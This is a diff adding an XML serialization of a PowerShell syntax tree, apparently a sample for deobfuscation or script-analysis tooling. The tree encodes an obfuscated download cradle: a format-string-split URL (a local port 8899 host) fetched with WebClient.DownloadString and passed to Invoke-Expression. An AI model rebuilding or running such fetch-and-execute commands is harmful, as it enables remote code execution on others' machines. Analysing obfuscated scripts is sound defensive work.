@@ -1,0 +1,62 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<ScriptBlockAst>
+  <Attributes />
+  <UsingStatements />
+  <NamedBlockAst>
+    <Statements>
+      <PipelineAst>
+        <PipelineElements>
+          <CommandAst>
+            <CommandElements>
+              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke-Expression</StringConstantExpressionAst>
+              <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                <Arguments>
+                  <ParenExpressionAst StaticType="System.Object">
+                    <PipelineAst>
+                      <PipelineElements>
+                        <CommandExpressionAst>
+                          <BinaryExpressionAst Operator="Format" StaticType="System.Object">
+                            <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">{0}{4}{1}{6}{3}{7}{2}{8}{5}</StringConstantExpressionAst>
+                            <ArrayLiteralAst StaticType="System.Object[]">
+                              <Elements>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">http:</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">1</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">.1:8899</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">7.</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">//</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">iye.txt</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">2</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">0.0</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">/q</StringConstantExpressionAst>
+                              </Elements>
+                            </ArrayLiteralAst>
+                          </BinaryExpressionAst>
+                          <Redirections />
+                        </CommandExpressionAst>
+                      </PipelineElements>
+                    </PipelineAst>
+                  </ParenExpressionAst>
+                </Arguments>
+                <ParenExpressionAst StaticType="System.Object">
+                  <PipelineAst>
+                    <PipelineElements>
+                      <CommandAst>
+                        <CommandElements>
+                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
+                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">System.Net.WebClient</StringConstantExpressionAst>
+                        </CommandElements>
+                        <Redirections />
+                      </CommandAst>
+                    </PipelineElements>
+                  </PipelineAst>
+                </ParenExpressionAst>
+                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">DownloadString</StringConstantExpressionAst>
+              </InvokeMemberExpressionAst>
+            </CommandElements>
+            <Redirections />
+          </CommandAst>
+        </PipelineElements>
+      </PipelineAst>
+    </Statements>
+  </NamedBlockAst>
+</ScriptBlockAst>
